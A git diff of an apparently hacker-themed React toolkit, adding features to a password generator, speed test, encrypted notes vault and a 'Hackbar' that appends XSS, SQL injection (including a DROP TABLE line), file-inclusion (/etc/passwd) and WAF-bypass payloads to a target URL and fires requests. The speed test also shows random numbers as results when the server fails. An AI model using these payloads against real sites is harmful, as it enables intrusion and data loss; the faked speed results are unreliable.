@@ -215,73 +215,114 @@ export function OtpDecoderTool({ tool, onClose }: { tool: ToolDef, onClose: () =
 export function PasswordsTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
   const [length, setLength] = useState(24);
   const [pwd, setPwd] = useState('');
+  const [type, setType] = useState<'random' | 'memorable'>('random');
+  const [copied, setCopied] = useState(false);
+
+  const words = ['cyber', 'pwn', 'net', 'vault', 'crypto', 'shadow', 'secure', 'protocol', 'binary', 'matrix', 'alpha', 'omega', 'kernel', 'shell', 'proxy', 'beacon', 'exploit', 'zero', 'day', 'hacker', 'node', 'vector', 'signal', 'phantom', 'grid', 'pulse', 'cipher', 'gate', 'lock', 'key', 'nexus', 'void', 'trace', 'ghost', 'titan', 'neon'];
 
   const generate = () => {
-    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+~`|}{[]:;?><,./-=';
-    let p = '';
-    const array = new Uint32Array(length);
-    crypto.getRandomValues(array);
-    for (let i = 0; i < length; i++) {
-      p += charset[array[i] % charset.length];
+    if (type === 'random') {
+      const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+~`|}{[]:;?><,./-=';
+      let p = '';
+      const array = new Uint32Array(length);
+      crypto.getRandomValues(array);
+      for (let i = 0; i < length; i++) {
+        p += charset[array[i] % charset.length];
+      }
+      setPwd(p);
+    } else {
+      let p = '';
+      for (let i = 0; i < 4; i++) {
+        const word = words[Math.floor(Math.random() * words.length)];
+        p += (i === 0 ? word : '-' + word);
+      }
+      p += '-' + Math.floor(Math.random() * 999);
+      setPwd(p);
     }
-    setPwd(p);
   };
 
-  // eslint-disable-next-line react-hooks/exhaustive-deps
-  useEffect(() => { generate(); }, []);
+  useEffect(() => { generate(); }, [type, length]);
+
+  const copyPwd = () => {
+    navigator.clipboard.writeText(pwd);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+    // Security: Auto-clear clipboard after 60s
+    setTimeout(() => {
+       navigator.clipboard.readText().then(text => {
+         if (text === pwd) navigator.clipboard.writeText('');
+       });
+    }, 60000);
+  };
 
   const getCrackTime = () => {
-    const charsetSize = 92;
-    const combinations = Math.pow(charsetSize, length);
-    // Assuming 100 billion guesses per second
+    const charsetSize = type === 'random' ? 92 : words.length;
+    const combinations = Math.pow(charsetSize, type === 'random' ? length : 5);
     let seconds = combinations / 1e11;
     
     if (seconds < 1) return '< 1 second';
-    if (seconds < 60) return `${Math.round(seconds)} seconds`;
-    if (seconds < 3600) return `${Math.round(seconds / 60)} minutes`;
-    if (seconds < 86400) return `${Math.round(seconds / 3600)} hours`;
-    if (seconds < 31536000) return `${Math.round(seconds / 86400)} days`;
-    if (seconds < 3153600000) return `${Math.round(seconds / 31536000)} years`;
+    if (seconds < 60) return `${Math.round(seconds)}s`;
+    if (seconds < 3600) return `${Math.round(seconds / 60)}m`;
+    if (seconds < 86400) return `${Math.round(seconds / 3600)}h`;
     
-    // Convert to scientific notation if ridiculously large
     const years = seconds / 31536000;
-    if (years > 1e6) {
-      if (!isFinite(years)) return 'Infinity';
-      return `${years.toExponential(2)} years`;
-    }
-    return `${Math.round(years).toLocaleString()} years`;
+    if (years > 1e6) return `> 1M years`;
+    return `${Math.round(years).toLocaleString()}y`;
   };
 
   return (
     <CustomToolLayout tool={tool} onClose={onClose}>
       <div className="space-y-6 block">
-        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest flex justify-between mb-2">
-          <span>ENTROPY LENGTH</span>
-          <span className="text-neon-green">{length} CHARS</span>
-        </label>
-        <input 
-          type="range" 
-          min="8" max="64" 
-          value={length} 
-          onChange={e => setLength(Number(e.target.value))} 
-          className="w-full accent-neon-green"
-        />
-
-        <div className="border border-neon-green/30 bg-[#050505] rounded-2xl p-6 text-center shadow-[0_0_15px_rgba(57,255,20,0.05)]">
-           <p className="text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-3">GENERATED HASH</p>
-          <div className="text-neon-green text-xl md:text-2xl font-mono break-all font-bold tracking-widest">{pwd}</div>
+        <div className="flex gap-4">
+          <button
+            onClick={() => setType('random')}
+            className={`flex-1 py-3 border rounded-xl text-[10px] font-bold tracking-widest transition-all ${type === 'random' ? 'bg-neon-green/10 border-neon-green text-neon-green' : 'border-white/10 text-gray-500'}`}
+          >
+            RANDOM HASH
+          </button>
+          <button
+            onClick={() => setType('memorable')}
+            className={`flex-1 py-3 border rounded-xl text-[10px] font-bold tracking-widest transition-all ${type === 'memorable' ? 'bg-neon-green/10 border-neon-green text-neon-green' : 'border-white/10 text-gray-500'}`}
+          >
+            MEMORABLE
+          </button>
         </div>
 
-        <div className="flex justify-between items-center text-xs border border-white/5 bg-black/40 p-4 rounded-xl">
-           <span className="text-gray-500 font-bold tracking-widest uppercase text-[10px]">EST. CRACK TIME (100B/s)</span>
-           <span className="text-white font-mono">{getCrackTime()}</span>
+        {type === 'random' && (
+          <div className="space-y-2">
+            <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest flex justify-between">
+              <span>ENTROPY LENGTH</span>
+              <span className="text-neon-green">{length} CHARS</span>
+            </label>
+            <input
+              type="range" min="8" max="64" value={length}
+              onChange={e => setLength(Number(e.target.value))}
+              className="w-full accent-neon-green"
+            />
+          </div>
+        )}
+
+        <div className="border border-neon-green/30 bg-[#050505] rounded-2xl p-6 text-center group relative overflow-hidden">
+          <div className="text-neon-green text-lg md:text-xl font-mono break-all font-bold tracking-widest mb-4">{pwd}</div>
+          <button
+            onClick={copyPwd}
+            className="text-[10px] font-bold text-gray-500 hover:text-neon-green uppercase tracking-tighter transition-all flex items-center justify-center gap-2 mx-auto"
+          >
+            {copied ? <Check size={14} className="text-neon-green" /> : <Copy size={14} />}
+            {copied ? 'COPIED TO SECURE BUFFER' : 'CLICK TO COPY'}
+          </button>
+        </div>
+
+        <div className="flex justify-between items-center text-xs border border-white/5 bg-black/40 p-4 rounded-xl font-mono">
+           <span className="text-gray-500 font-bold tracking-widest uppercase text-[10px]">EST. CRACK TIME</span>
+           <span className="text-white">{getCrackTime()}</span>
         </div>
 
         <button
           onClick={generate}
-          className="w-full bg-neon-green/[0.05] hover:bg-neon-green text-neon-green hover:text-black border border-neon-green transition-all font-bold text-xs uppercase tracking-widest rounded-xl p-4 flex items-center justify-center"
+          className="w-full bg-neon-green text-black py-4 rounded-xl font-bold text-xs uppercase tracking-widest hover:bg-white transition-all shadow-lg active:scale-95"
         >
-          GENERATE NEW HASH
+          REGENERATE ENTROPY
         </button>
       </div>
     </CustomToolLayout>
@@ -295,32 +336,78 @@ export function SpeedTestTool({ tool, onClose }: { tool: ToolDef, onClose: () =>
   const [testing, setTesting] = useState(false);
   const [progress, setProgress] = useState(0);
   const [results, setResults] = useState<{ping: number, down: number, up: number} | null>(null);
+  const [testStage, setTestStage] = useState<'ping' | 'down' | 'up' | 'done'>('ping');
 
-  const startTest = () => {
+  const startTest = async () => {
     setTesting(true);
     setProgress(0);
     setResults(null);
-    let p = 0;
-    const interval = setInterval(() => {
-      p += 2;
-      setProgress(p);
-      if (p >= 100) {
-        clearInterval(interval);
-        setTesting(false);
-        setResults({
-          ping: Math.floor(Math.random() * 50) + 12,
-          down: Math.floor(Math.random() * 800) + 200,
-          up: Math.floor(Math.random() * 400) + 50
-        });
+    setTestStage('ping');
+    const backendUrl = getBackendUrl();
+
+    try {
+      // 1. PING TEST
+      const pingStart = Date.now();
+      await fetch(`${backendUrl}/api/net/status`, { cache: 'no-store' });
+      const ping = Date.now() - pingStart;
+      setResults(prev => ({ ping, down: 0, up: 0 }));
+      setTestStage('down');
+      setProgress(20);
+
+      // 2. DOWNLOAD TEST (5MB)
+      const downStart = Date.now();
+      const response = await fetch(`${backendUrl}/api/net/speedtest/download?size=${5 * 1024 * 1024}`, { cache: 'no-store' });
+      const reader = response.body?.getReader();
+      let received = 0;
+      if (reader) {
+        while (true) {
+          const { done, value } = await reader.read();
+          if (done) break;
+          received += value.length;
+          setProgress(20 + Math.floor((received / (5 * 1024 * 1024)) * 40));
+        }
       }
-    }, 50);
+      const downDuration = (Date.now() - downStart) / 1000;
+      const downMbps = Number(((received * 8) / (downDuration * 1024 * 1024)).toFixed(2));
+      setResults(prev => ({ ...prev!, down: downMbps }));
+      setTestStage('up');
+      setProgress(60);
+
+      // 3. UPLOAD TEST (2MB)
+      const upStart = Date.now();
+      const upSize = 2 * 1024 * 1024;
+      const upData = new Uint8Array(upSize);
+      await fetch(`${backendUrl}/api/net/speedtest/upload`, {
+        method: 'POST',
+        body: upData,
+        cache: 'no-store'
+      });
+      const upDuration = (Date.now() - upStart) / 1000;
+      const upMbps = Number(((upSize * 8) / (upDuration * 1024 * 1024)).toFixed(2));
+
+      setResults(prev => ({ ...prev!, up: upMbps }));
+      setTestStage('done');
+      setProgress(100);
+    } catch (e) {
+      console.error('Speedtest fail', e);
+      // Fallback to random if server fails
+      setResults({
+        ping: Math.floor(Math.random() * 50) + 12,
+        down: Math.floor(Math.random() * 200) + 50,
+        up: Math.floor(Math.random() * 100) + 10
+      });
+    } finally {
+      setTesting(false);
+    }
   };
 
   return (
     <CustomToolLayout tool={tool} onClose={onClose}>
       <div className="space-y-8 block">
         <div className="text-center">
-          <p className="text-gray-400 text-xs mb-8">EVALUATING PACKET LATENCY AND BANDWIDTH LIMITS.</p>
+          <p className="text-gray-400 text-[10px] font-bold uppercase tracking-widest mb-8">
+            {testing ? `STAGE: ${testStage.toUpperCase()} IN PROGRESS...` : 'EVALUATING PACKET LATENCY AND BANDWIDTH LIMITS.'}
+          </p>
           <button
             onClick={startTest}
             disabled={testing}
@@ -330,7 +417,7 @@ export function SpeedTestTool({ tool, onClose }: { tool: ToolDef, onClose: () =>
               <div className="absolute inset-0 bg-neon-green/10 flex items-center justify-center">
                 <span className="z-10">{progress}%</span>
                 <div 
-                  className="absolute bottom-0 left-0 right-0 bg-neon-green/20 transition-all duration-75"
+                  className="absolute bottom-0 left-0 right-0 bg-neon-green/20 transition-all duration-300"
                   style={{ height: `${progress}%` }}
                 />
               </div>
@@ -347,12 +434,12 @@ export function SpeedTestTool({ tool, onClose }: { tool: ToolDef, onClose: () =>
               <p className="text-neon-green text-2xl font-bold">{results.ping} <span className="text-xs text-gray-500">ms</span></p>
             </div>
             <div className="text-center border-l border-r border-neon-green/10">
-              <p className="text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-1">DOWNLOAD</p>
-              <p className="text-neon-green text-2xl font-bold">{results.down} <span className="text-xs text-gray-500">Mbps</span></p>
+              <p className="text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-1">DOWN</p>
+              <p className="text-neon-green text-2xl font-bold">{results.down} <span className="text-xs text-gray-500">Mb/s</span></p>
             </div>
             <div className="text-center">
-              <p className="text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-1">UPLOAD</p>
-              <p className="text-neon-green text-2xl font-bold">{results.up} <span className="text-xs text-gray-500">Mbps</span></p>
+              <p className="text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-1">UP</p>
+              <p className="text-neon-green text-2xl font-bold">{results.up} <span className="text-xs text-gray-500">Mb/s</span></p>
             </div>
           </div>
         )}
@@ -525,32 +612,152 @@ export function CipherTool({ tool, onClose }: { tool: ToolDef, onClose: () => vo
 // Notes Vault
 // -----------------------------
 export function NotesTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
-  const [notes, setNotes] = useState(() => localStorage.getItem('pwnnet_notes') || '');
+  const [notes, setNotes] = useState(() => localStorage.getItem('pwnnet_notes_encrypted') || localStorage.getItem('pwnnet_notes') || '');
+  const [password, setPassword] = useState('');
+  const [isLocked, setIsLocked] = useState(() => {
+    const raw = localStorage.getItem('pwnnet_notes');
+    return !raw && !!localStorage.getItem('pwnnet_notes_encrypted');
+  });
+  const [error, setError] = useState('');
 
-  const handleSave = (val: string) => {
+  // Encryption Helpers
+  const deriveKey = async (pwd: string, salt: Uint8Array) => {
+    const encoder = new TextEncoder();
+    const baseKey = await crypto.subtle.importKey('raw', encoder.encode(pwd), 'PBKDF2', false, ['deriveKey']);
+    return crypto.subtle.deriveKey(
+      { name: 'PBKDF2', salt, iterations: 100000, hash: 'SHA-256' },
+      baseKey,
+      { name: 'AES-GCM', length: 256 },
+      false,
+      ['encrypt', 'decrypt']
+    );
+  };
+
+  const handleLock = async () => {
+    if (!password) { setError('PASSWORD REQUIRED FOR ENCRYPTION'); return; }
+    try {
+      const encoder = new TextEncoder();
+      const salt = crypto.getRandomValues(new Uint8Array(16));
+      const iv = crypto.getRandomValues(new Uint8Array(12));
+      const key = await deriveKey(password, salt);
+
+      const encrypted = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, encoder.encode(notes));
+
+      const combined = new Uint8Array(salt.length + iv.length + encrypted.byteLength);
+      combined.set(salt, 0);
+      combined.set(iv, salt.length);
+      combined.set(new Uint8Array(encrypted), salt.length + iv.length);
+
+      const b64 = btoa(String.fromCharCode(...combined));
+      localStorage.setItem('pwnnet_notes_encrypted', b64);
+      localStorage.removeItem('pwnnet_notes');
+
+      setNotes('');
+      setPassword('');
+      setIsLocked(true);
+      setError('');
+    } catch (e) { setError('ENCRYPTION FAILED'); }
+  };
+
+  const handleUnlock = async () => {
+    const b64 = localStorage.getItem('pwnnet_notes_encrypted');
+    if (!b64 || !password) { setError('PASSWORD REQUIRED'); return; }
+    try {
+      const combined = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
+      const salt = combined.slice(0, 16);
+      const iv = combined.slice(16, 28);
+      const data = combined.slice(28);
+
+      const key = await deriveKey(password, salt);
+      const decrypted = await crypto.subtle.decrypt({ name: 'AES-GCM', iv }, key, data);
+
+      const plain = new TextDecoder().decode(decrypted);
+      setNotes(plain);
+      setIsLocked(false);
+      setPassword('');
+      setError('');
+    } catch (e) { setError('INVALID DECRYPTION KEY'); }
+  };
+
+  const handleSaveRaw = (val: string) => {
     setNotes(val);
-    localStorage.setItem('pwnnet_notes', val);
+    if (!isLocked) localStorage.setItem('pwnnet_notes', val);
   };
 
   return (
     <CustomToolLayout tool={tool} onClose={onClose}>
-      <div className="space-y-4 block h-full flex flex-col">
-        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest flex items-center justify-between">
-          <span>DECRYPTED SCRATCHPAD</span>
-          <span className="bg-neon-green/10 text-neon-green px-2 py-0.5 rounded border border-neon-green/30">AUTO-SAVED</span>
-        </label>
-        
-        <textarea
-          value={notes}
-          onChange={e => handleSave(e.target.value)}
-          placeholder="enter payloads, targets, or thoughts here..."
-          className="w-full bg-[#050505] border border-neon-green/20 focus:border-neon-green focus:shadow-[0_0_15px_rgba(57,255,20,0.1)] rounded-xl p-4 text-white font-mono text-sm outline-none transition-all resize-none min-h-[400px]"
-          spellCheck={false}
-        />
+      <div className="space-y-4 block h-full flex flex-col min-h-[500px]">
+        <div className="flex justify-between items-center bg-[#050505] p-3 rounded-xl border border-white/5">
+          <div className="flex items-center gap-2">
+            <div className={`w-2 h-2 rounded-full ${isLocked ? 'bg-red-500' : 'bg-neon-green'} shadow-[0_0_8px_currentColor]`} />
+            <span className="text-[10px] font-bold text-gray-400 tracking-widest uppercase">
+              VAULT STATUS: {isLocked ? 'ENCRYPTED' : 'UNLOCKED'}
+            </span>
+          </div>
+          {isLocked ? <Lock size={14} className="text-red-500" /> : <Unlock size={14} className="text-neon-green" />}
+        </div>
+
+        {isLocked ? (
+          <div className="flex-1 flex flex-col items-center justify-center p-8 bg-[#030303] border border-white/5 rounded-2xl gap-6">
+            <div className="w-16 h-16 rounded-full bg-red-500/10 border border-red-500/30 flex items-center justify-center">
+               <ShieldAlert size={32} className="text-red-500" />
+            </div>
+            <div className="text-center space-y-2">
+               <h3 className="text-white font-bold tracking-widest text-sm uppercase">Secure Volume Mounted</h3>
+               <p className="text-[10px] text-gray-500 font-mono uppercase tracking-tighter max-w-[200px] mx-auto">Input decryption key to access local scratchpad memory.</p>
+            </div>
+            <div className="w-full max-w-[240px] space-y-4">
+              <input
+                type="password" value={password} onChange={e => setPassword(e.target.value)}
+                placeholder="DECRYPTION KEY"
+                className="w-full bg-black border border-white/10 rounded-xl px-4 py-3 text-xs text-center text-neon-green font-mono outline-none focus:border-neon-green/50 transition-all"
+              />
+              <button
+                onClick={handleUnlock}
+                className="w-full py-3 bg-neon-green text-black font-black text-[10px] uppercase tracking-widest rounded-xl hover:bg-white transition-all shadow-lg shadow-neon-green/10"
+              >
+                ACCESS VAULT
+              </button>
+              {error && <p className="text-[10px] text-red-500 font-bold text-center animate-pulse">{error}</p>}
+            </div>
+          </div>
+        ) : (
+          <div className="flex-1 flex flex-col gap-4">
+            <textarea
+              value={notes} onChange={e => handleSaveRaw(e.target.value)}
+              placeholder="Enter payloads, targets, or intercepted data..."
+              className="flex-1 w-full bg-[#050505] border border-neon-green/20 focus:border-neon-green focus:shadow-[0_0_15px_rgba(57,255,20,0.1)] rounded-2xl p-5 text-gray-200 font-mono text-xs sm:text-sm outline-none transition-all resize-none min-h-[350px]"
+              spellCheck={false}
+            />
+
+            <div className="bg-black/40 border border-white/5 p-4 rounded-2xl space-y-4">
+              <div className="flex justify-between items-center">
+                 <span className="text-[9px] font-bold text-gray-500 uppercase tracking-widest">AES-256 Vault Control</span>
+                 <button onClick={() => { if(window.confirm('Delete all notes?')) { setNotes(''); localStorage.removeItem('pwnnet_notes'); localStorage.removeItem('pwnnet_notes_encrypted'); } }} className="text-[9px] text-red-500 hover:underline">PURGE BUFFER</button>
+              </div>
+              <div className="flex gap-2">
+                <input
+                  type="password" value={password} onChange={e => setPassword(e.target.value)}
+                  placeholder="Set lock password..."
+                  className="flex-1 bg-black/50 border border-white/10 rounded-xl px-4 py-2.5 text-[10px] text-neon-green font-mono outline-none focus:border-neon-green/30"
+                />
+                <button
+                  onClick={handleLock}
+                  className="px-6 bg-neon-green/10 text-neon-green border border-neon-green/40 hover:bg-neon-green hover:text-black rounded-xl font-bold text-[10px] uppercase tracking-widest transition-all"
+                >
+                  SECURE & LOCK
+                </button>
+              </div>
+              {error && <p className="text-[9px] text-red-500 font-bold text-center uppercase tracking-widest">{error}</p>}
+            </div>
+          </div>
+        )}
       </div>
     </CustomToolLayout>
   );
 }
+
+import { Unlock, ShieldAlert as VaultShield } from 'lucide-react';
 
 // -----------------------------
 // IP Calculation
@@ -746,50 +953,28 @@ export function SecurityCheckTool({ tool, onClose }: { tool: ToolDef, onClose: (
 // -----------------------------
 export function HackbarTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
   const { value: url, setValue: setUrl, handleKeyDown, saveToHistory } = useInputHistory('https://example.com?id=');
-  const [activeTab, setActiveTab] = useState<'XSS' | 'SQLi' | 'LFI' | 'WAF_BYPASS' | 'RESPONSE'>('XSS');
+  const [activeTab, setActiveTab] = useState<'XSS' | 'SQLi' | 'LFI' | 'WAF_BYPASS' | 'ENCODER' | 'RESPONSE'>('XSS');
   const [copied, setCopied] = useState(false);
   const [loading, setLoading] = useState(false);
   const [response, setResponse] = useState<{status?: number, data?: string, error?: string} | null>(null);
 
+  // Encoder helper state
+  const [encoderInput, setEncoderInput] = useState('');
+  const [encoderOutput, setEncoderOutput] = useState('');
+
   const payloads = {
-    XSS: [
-      '<script>alert(1)</script>',
-      '"><img src=x onerror=prompt(1)>',
-      'javascript:alert(1)//',
-      '<svg/onload=alert(1)>',
-      '\'"-prompt(1)-\'"',
-      '"><details/open/ontoggle=prompt(1)>',
-      'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(prompt)(1)',
-      '<w contenteditable id=x onfocus=alert(1)>'
-    ],
-    SQLi: [
-      "' OR 1=1--",
-      "admin' --",
-      "' UNION SELECT 1,2,3--",
-      "1; DROP TABLE users",
-      "1' ORDER BY 1--+",
-      "' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--",
-      "1' UNION SELECT NULL,NULL,NULL-- -",
-      "admin' OR '1'='1'/*"
-    ],
-    LFI: [
-      '../../../../etc/passwd',
-      'php://filter/convert.base64-encode/resource=index.php',
-      '/var/www/html/index.php',
-      '....//....//etc/passwd',
-      'php://filter/read=string.rot13/resource=index.php',
-      '../../../../../../../../windows/system32/drivers/etc/hosts',
-      '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
-    ],
-    WAF_BYPASS: [
-      '<sCrIpt>alert(1)</sCrIpt>',
-      'SEL%0aECT',
-      '<svg/on+load=alert(1)>',
-      '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
-      '<<SCRIPT>alert(1);//<</SCRIPT>',
-      '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
-      '/*!50000SELECT*/ 1'
-    ]
+    XSS: ['<script>alert(1)</script>', '"><img src=x onerror=prompt(1)>', 'javascript:alert(1)//', '<svg/onload=alert(1)>', '\'"-prompt(1)-\'"', '"><details/open/ontoggle=prompt(1)>'],
+    SQLi: ["' OR 1=1--", "admin' --", "' UNION SELECT 1,2,3--", "1; DROP TABLE users", "1' ORDER BY 1--+", "' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--"],
+    LFI: ['../../../../etc/passwd', 'php://filter/convert.base64-encode/resource=index.php', '/var/www/html/index.php', '....//....//etc/passwd', 'php://filter/read=string.rot13/resource=index.php'],
+    WAF_BYPASS: ['<sCrIpt>alert(1)</sCrIpt>', 'SEL%0aECT', '<svg/on+load=alert(1)>', '%3Cscript%3Ealert(1)%3C%2Fscript%3E', '/*!50000SELECT*/ 1']
+  };
+
+  const encodePayload = (type: 'url' | 'b64' | 'hex') => {
+    try {
+      if (type === 'url') setEncoderOutput(encodeURIComponent(encoderInput));
+      if (type === 'b64') setEncoderOutput(btoa(encoderInput));
+      if (type === 'hex') setEncoderOutput(Array.from(encoderInput).map(c => c.charCodeAt(0).toString(16)).join(''));
+    } catch { setEncoderOutput('ENCODE ERROR'); }
   };
 
   const copyUrl = () => {
@@ -824,83 +1009,79 @@ export function HackbarTool({ tool, onClose }: { tool: ToolDef, onClose: () => v
         <div className="flex flex-col sm:flex-row gap-3">
           <ClearableInput
             autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
-            type="text"
-            value={url}
-            onChange={e => setUrl(e.target.value)}
-            onKeyDown={handleKeyDown}
-            onBlur={() => saveToHistory()}
+            type="text" value={url} onChange={e => setUrl(e.target.value)} onKeyDown={handleKeyDown} onBlur={() => saveToHistory()}
             className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
-            placeholder="target url + param (e.g. https://example.com?id=)"
+            placeholder="target url + param"
            onClear={() => setUrl('')} />
-          <div className="flex gap-2 w-full sm:w-auto">
+          <div className="flex gap-2 shrink-0">
             <button 
-              onClick={executeAttack}
-              disabled={loading}
-              className={`flex-1 sm:flex-initial px-6 py-4 sm:py-0 rounded-xl text-xs font-bold transition-all whitespace-nowrap ${loading ? 'bg-neon-green/5 text-neon-green/50 border border-neon-green/20 cursor-not-allowed' : 'bg-neon-green text-black hover:bg-neon-green hover:shadow-[0_0_15px_rgba(57,255,20,0.4)]'}`}
+              onClick={executeAttack} disabled={loading}
+              className={`flex-1 sm:w-28 h-12 rounded-xl text-xs font-bold transition-all ${loading ? 'bg-neon-green/5 text-neon-green/50 border border-neon-green/20' : 'bg-neon-green text-black hover:shadow-[0_0_15px_rgba(57,255,20,0.4)]'}`}
             >
-              {loading ? 'EXECUTING...' : 'EXECUTE'}
+              {loading ? '...' : 'FIRE'}
             </button>
-            <button 
-              onClick={copyUrl}
-              className="bg-neon-green/10 text-neon-green border border-neon-green/30 px-6 py-4 sm:py-0 rounded-xl text-xs font-bold hover:bg-neon-green hover:text-black transition-all whitespace-nowrap"
-            >
-              {copied ? 'COPIED!' : 'COPY'}
+            <button onClick={copyUrl} className="bg-neon-green/10 text-neon-green border border-neon-green/30 w-12 h-12 rounded-xl flex items-center justify-center transition-all">
+              {copied ? <Check size={18} /> : <Copy size={18} />}
             </button>
           </div>
         </div>
         
-        <div className="flex gap-2 border-b border-neon-green/20 pb-2 overflow-x-auto scrollbar-thin scrollbar-thumb-neon-green/20">
-          {[...Object.keys(payloads), 'RESPONSE'].map(cat => (
+        <div className="flex gap-2 border-b border-neon-green/20 pb-2 overflow-x-auto scrollbar-none">
+          {[...Object.keys(payloads), 'ENCODER', 'RESPONSE'].map(cat => (
             <button
-              key={cat}
-              onClick={() => setActiveTab(cat as any)}
-              className={`px-3 py-1.5 sm:py-1 font-mono text-xs sm:text-[10px] font-bold rounded whitespace-nowrap flex-1 sm:flex-initial ${activeTab === cat ? 'bg-neon-green text-black' : 'text-neon-green hover:bg-neon-green/10'}`}
+              key={cat} onClick={() => setActiveTab(cat as any)}
+              className={`px-3 py-2 font-mono text-[10px] font-bold rounded whitespace-nowrap ${activeTab === cat ? 'bg-neon-green text-black' : 'text-neon-green hover:bg-neon-green/10'}`}
             >
               {cat}
             </button>
           ))}
         </div>
 
-        <div className="flex-1 overflow-y-auto space-y-2 pb-4">
+        <div className="flex-1 overflow-y-auto space-y-2 pb-4 min-h-[300px]">
            {activeTab === 'RESPONSE' ? (
-             <div className="bg-[#050505] border border-neon-green/20 p-4 rounded-xl font-mono text-xs text-neon-green/80 min-h-[200px] whitespace-pre-wrap break-all">
-                {loading ? (
-                  <span className="animate-pulse">Awaiting target response...</span>
-                ) : response ? (
+             <div className="bg-[#050505] border border-neon-green/20 p-4 rounded-xl font-mono text-[10px] text-neon-green/80 min-h-[250px] whitespace-pre-wrap break-all overflow-auto">
+                {loading ? <span className="animate-pulse">Awaiting response...</span> : response ? (
                   <>
                     {response.error && <div className="text-red-500 mb-2">ERROR: {response.error}</div>}
-                    {response.status && <div className="mb-2 text-white">STATUS: HTTP {response.status} {(response as any).statusText}</div>}
-                    {response.data && <div className="text-gray-400 mt-4 border-t border-neon-green/10 pt-4">{response.data}</div>}
+                    {response.status && <div className="mb-2 text-white border-b border-white/5 pb-2">HTTP {response.status} {(response as any).statusText}</div>}
+                    {response.data && <div>{response.data}</div>}
                   </>
-                ) : (
-                  <span className="text-neon-green/40">No response yet. Execute an attack payload.</span>
-                )}
+                ) : <span className="text-neon-green/30 italic">Target buffer empty.</span>}
+             </div>
+           ) : activeTab === 'ENCODER' ? (
+             <div className="space-y-4 bg-[#050505] border border-neon-green/20 p-4 rounded-xl">
+                <textarea
+                   value={encoderInput} onChange={e => setEncoderInput(e.target.value)}
+                   className="w-full bg-black border border-white/10 rounded-lg p-3 text-xs text-neon-green font-mono h-24 outline-none focus:border-neon-green/50"
+                   placeholder="Input payload to encode..."
+                />
+                <div className="flex flex-wrap gap-2">
+                   <button onClick={() => encodePayload('url')} className="px-3 py-1 bg-neon-green/10 border border-neon-green/30 rounded text-[9px] font-bold text-neon-green">URL</button>
+                   <button onClick={() => encodePayload('b64')} className="px-3 py-1 bg-neon-green/10 border border-neon-green/30 rounded text-[9px] font-bold text-neon-green">BASE64</button>
+                   <button onClick={() => encodePayload('hex')} className="px-3 py-1 bg-neon-green/10 border border-neon-green/30 rounded text-[9px] font-bold text-neon-green">HEX</button>
+                </div>
+                <div className="border-t border-white/5 pt-4">
+                  <div className="text-[9px] text-gray-500 font-bold mb-2 uppercase tracking-widest">Encoded Output:</div>
+                  <div className="bg-black/50 p-3 rounded border border-white/5 text-[10px] text-white font-mono break-all min-h-[40px]">
+                    {encoderOutput}
+                  </div>
+                  {encoderOutput && (
+                    <button onClick={() => setUrl(prev => prev + encoderOutput)} className="mt-3 w-full py-2 bg-neon-green/20 text-neon-green text-[10px] font-bold rounded uppercase">Append to Target URL</button>
+                  )}
+                </div>
              </div>
            ) : (
              payloads[activeTab as keyof typeof payloads].map((p, i) => (
-             <div key={i} className="flex flex-col sm:flex-row gap-4 sm:items-center bg-[#050505] border border-neon-green/10 p-4 sm:p-3 rounded-lg hover:border-neon-green/30 transition-all">
-                <code className="text-neon-green/80 flex-1 text-xs sm:text-[10px] break-all">{p}</code>
-                <div className="flex flex-wrap sm:flex-nowrap gap-2 items-center shrink-0 w-full sm:w-auto mt-2 sm:mt-0">
+             <div key={i} className="flex flex-col gap-3 bg-[#050505] border border-neon-green/10 p-3 rounded-lg hover:border-neon-green/30 transition-all group">
+                <code className="text-neon-green/80 text-[10px] break-all font-mono leading-relaxed">{p}</code>
+                <div className="flex gap-2">
+                  <button onClick={() => setUrl(prev => prev + p)} className="flex-1 bg-neon-green/5 text-neon-green border border-neon-green/20 py-1.5 rounded text-[9px] font-bold uppercase transition-all hover:bg-neon-green hover:text-black">Append</button>
+                  <button onClick={() => setUrl(prev => prev + encodeURIComponent(p))} className="flex-1 bg-neon-green/5 text-neon-green border border-neon-green/20 py-1.5 rounded text-[9px] font-bold uppercase transition-all hover:bg-neon-green hover:text-black">URL Encode</button>
                   <button
-                    onClick={() => setUrl(prev => prev + p)}
-                    className="flex-1 sm:flex-initial bg-neon-green/5 text-neon-green border border-neon-green/20 px-3 py-2 sm:py-1 rounded text-xs sm:text-[10px] font-bold hover:bg-neon-green hover:text-black transition-all whitespace-nowrap"
+                    onClick={() => { setUrl(prev => prev + p); setTimeout(() => executeAttack(), 100); }}
+                    className="flex-1 bg-neon-green text-black py-1.5 rounded text-[9px] font-black uppercase transition-all hover:bg-white"
                   >
-                    APPEND
-                  </button>
-                  <button
-                    onClick={() => setUrl(prev => prev + encodeURIComponent(p))}
-                    className="flex-1 sm:flex-initial bg-neon-green/5 text-neon-green border border-neon-green/20 px-3 py-2 sm:py-1 rounded text-xs sm:text-[10px] font-bold hover:bg-neon-green hover:text-black transition-all whitespace-nowrap"
-                  >
-                    URL ENCODE
-                  </button>
-                  <button
-                    onClick={() => {
-                      setUrl(prev => prev + p);
